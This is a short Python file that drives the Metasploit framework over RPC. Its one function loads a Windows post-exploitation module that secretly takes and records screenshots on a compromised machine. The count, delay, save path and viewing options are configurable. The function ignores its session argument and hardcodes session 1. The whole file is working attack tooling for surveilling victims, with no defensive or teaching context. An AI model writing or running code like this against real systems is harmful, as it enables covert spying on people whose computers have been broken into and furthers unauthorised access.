from metasploit.msfrpc import MsfRpcClient


def post_take_screenshot(client, session, path, count, delay, record, view_screenshots):
        post = client.modules.use('post', 'windows/gather/homemade_screen_spy')
        post['SESSION'] = 1
        post['PATH'] = path
        post['COUNT'] = count
        post['DELAY'] = delay
        post['RECORD'] = record
        post['VIEW_SCREENSHOTS'] = view_screenshots
        post.execute()
